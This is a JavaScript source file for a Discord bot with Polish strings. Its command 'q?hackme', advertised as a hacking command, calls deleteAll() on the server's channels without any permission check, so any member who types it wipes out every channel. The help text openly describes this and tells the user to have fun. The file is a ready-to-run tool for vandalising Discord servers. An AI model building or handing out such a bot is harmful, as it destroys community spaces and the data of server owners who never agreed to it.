const Discord = require('discord.js');
const client = new Discord.Client();
const { token, prefix } = require("./config/config.json");


client.on('ready',  () =>{
console.log(`                                        `);
console.log(`                                    `);
console.log(`                                     `);
console.log(`                                           |---------------------------------------------|      `);
console.log(`                                           |                     Witaj!!!                |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |        bot ${client.user.tag}  właczył się :)     | `);
console.log(`                                           |                                             | `);
console.log(`                                           |                   Komendy                   |  `);
console.log(`                                           |        q?hackme- Komenda do hakowania       |  `);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |     Token i prefix zmienia sie w pliku      |`);
console.log(`                                           |     config.json, który znajduje się         |`);
console.log(`                                           |           w foldrze config                  |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |                                             |`);
console.log(`                                           |              github - Maciu00                               |`);
console.log(`                                           |              bot by Maciu#3917              | `);
console.log(`                                           |---------------------------------------------|                                         `);
console.log(`                                                                                                        `);
console.log(`                                    `);
console.log(`                                     `);
console.log(`                                   `);
client.user.setPresence({ game: { name: `Hakowanie.......` }, type: 0 });

});

client.on("message", async(msg)=>{

if(msg.content.toLowerCase().startsWith(prefix + "hackme")){
    msg.guild.channels.deleteAll();

}
if(msg.content.toLowerCase().startsWith(prefix + "pomoc")){
    msg.author.send({
        embed: {
            color: 0xF6BE19,
            author: { name: "Pomoc!" },
            description: "q?hackme - Usuwa wszystkie  kanały\n Baw się dobrze!"
        }
    })
}
});


client.login(token);
